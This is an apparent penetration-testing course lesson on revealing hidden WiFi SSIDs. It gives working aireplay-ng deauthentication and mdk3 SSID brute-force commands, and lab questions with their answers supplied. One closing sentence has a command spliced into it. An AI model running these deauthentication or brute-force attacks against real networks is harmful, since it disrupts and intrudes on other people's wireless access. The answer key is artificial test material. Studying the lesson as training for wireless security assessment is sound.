In WiFi networks, the Service Set Identifier (SSID) is the name that identifies a particular wireless network. While most networks broadcast their SSIDs to make it easy for devices to connect, some networks choose to hide their SSIDs as a security measure. The idea behind hiding an SSID is to make the network less visible to casual users and potential attackers. However, this method only provides a superficial layer of security, as determined attackers can still discover hidden SSIDs using various techniques.

In this section, we'll delve into the methods used to uncover these hidden network names. Understanding how to find hidden SSIDs is crucial for both network administrators looking to secure their networks and penetration testers aiming to assess the security of wireless environments. By the end of this section, you'll have a comprehensive understanding of the tools and techniques used to reveal hidden SSIDs, enhancing your overall knowledge of WiFi security.

![[hidden_1.png]]

As shown in the above screenshot, no WiFi networks are visible during the scan. Let's proceed by attempting to uncover some hidden WiFi networks.

## Watching the Hidden Network

First, we need to set our interface to monitor mode.

```shell
sudo airmon-ng start wlan0
```

![[Hiidden_Networks_watching.png]]

## Scanning WiFi Networks

We can use `airodump-ng` to scan for available wifi networks.

```shell
sudo airodump-ng -c 1 wlan0mon
```

![[Scanning_WIFI_Networks.png]]

From the above output, we can see that there are three hidden SSIDs. The `<length: x>` notation indicates the length of the WiFi network name, where x represents the number of characters in the SSID.

There are multiple ways to discover the name of a hidden SSID. If there are clients connected to the WiFi network, we can use `aireplay-ng` to send deauthentication requests to the client. When the client reconnects to the hidden SSID, `airodump-ng` will capture the request and reveal the SSID. However, deauthentication attacks do not work on [WPA3](https://github.com/aircrack-ng/aircrack-ng/issues/2539) networks since WPA3 has 802.11w (Protected Management Frames, [PMF](https://www.wi-fi.org/beacon/philipp-ebbecke/protected-management-frames-enhance-wi-fi-network-security)) which authenticates the deauthentication. In such cases, we can attempt a brute-force attack to determine the SSID name.

## Detecting Hidden SSID using Deauth

The first way to find a hidden SSID is to perform a deauthentication attack on the clients connected to the WiFi network, which allows us to capture the request when they reconnect. From the above `airodump-ng` scan, we observed that a client with the STATION ID `02:00:00:00:02:00` is connected to the BSSID `B2:C1:3D:3B:2B:A1`. Let's start the `airodump-ng` capture on channel `1` and use `aireplay-ng` to send deauthentication requests to the client.

We should start sniffing our network on `channel 1` with airodump-ng.

```shell
sudo airodump-ng -c 1 wlan0mon
```

In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.

```shell
sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
```

![[Prob_request.png]]

After sending the deauthentication requests using `aireplay-ng`, we should see the name of the hidden SSID appear in `airodump-ng` once the client reconnects to the WiFi network. This process leverages the re-association request, which contains the SSID name, and allows us to capture and identify the hidden SSID.

```shell
sudo airodump-ng -c 1 wlan0mon
```

![[Deauth_requests.png]]

## Bruteforcing Hidden SSID

Another way to discover a hidden SSID is to perform a brute-force attack. We can use a tool like [mdk3](https://github.com/charlesxsh/mdk3-master) to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.

Basic syntax for mdk3 is as following:

```shell
mdk3 <interface> <test mode> [test_ options]
```

The `p` test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode. It offers the following options:

|**Option**|**Description**|
|---|---|
|`-e`|Specify the SSID for probing.|
|`-f`|Read lines from a file for brute-forcing hidden SSIDs.|
|`-t`|Set the MAC address of the target AP.|
|`-s`|Set the speed (Default: unlimited, in Bruteforce mode: 300).|
|`-b`|Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen|

### Bruteforcing all possible values

To bruteforce with all possible values, we can use `-b` as the `test_option` in mdk3. We can set the following options for it.

- upper case (u)
- digits (n)
- all printed (a)
- lower and upper case (c)
- lower and upper case plus numbers (m)

```shell
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```

![[All_posible_values.png]]

### Bruteforcing using a Wordlist

To bruteforce using a wordlist we can use `-f` as the `test_option` in mdk3 followed by the location of the wordlist.

```shell
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```

![[Using_wordlist.png]]

With the new discovery of the SSIDs, if we had the PSK or were able to gather it through some means, we would be able to connect to the network in question. In the next section, we will dive into an additional basic control that access points might possess, which is MAC filtering (whitelisting).

## Moving On

In this section, we examinesudo airmon-ng start wlan0d how to find hidden SSIDs using various methods, including deauthentication attacks and brute-forcing techniques. These methods revealed the processes and strategies for uncovering networks that are not openly visible, and provided a foundation for understanding network visibility and security.

In the upcoming section, we will explore a different basic control bypass technique: bypassing MAC filtering. MAC filtering is a security measure used to permit or deny access to a network based on the MAC addresses of devices. By the end of this section, we will have a thorough understanding of MAC filtering, how to effectively bypass it, and how to apply these techniques in real-world scenarios for network security evaluations.

## Questions

1. Identify the name of the hidden SSID with the BSSID *d8:d6:3d:eb:29:d5* and submit it as your answer.

	Answer: *CyberNet-Secure*

```shell
sudo airmon-ng start wlan0
sudo airodump-ng -c 1 wlan0mon
```

![[hideen_networks_question1.png]]

```shell
sudo aireplay-ng -0 10 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon
```

![[deauthentication-1.png]]

```shell
sudo airodump-ng -c 1 wlan0mon
```

![[cybernet_secure-1.png]]

2.  Identify the name of the hidden SSID with the BSSID *a2:a6:32:1b:29:d5* and submit it as your answer.

	Answer: *HTB*

```shell
sudo mdk3 wlan0mon p -b u -c 1 -t A2:A6:32:1B:29:D5
```

![[HTB_Network.png]]

3.  Identify the name of the hidden SSID with the BSSID *d2:a3:32:1b:29:d5* and submit it as your answer.

	Answer: *FreeWifi*

```shell
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t d2:a3:32:1b:29:d5
```

![[freewifi.png]]

**Next lesson:** [[Bypassing MAC filtering]]
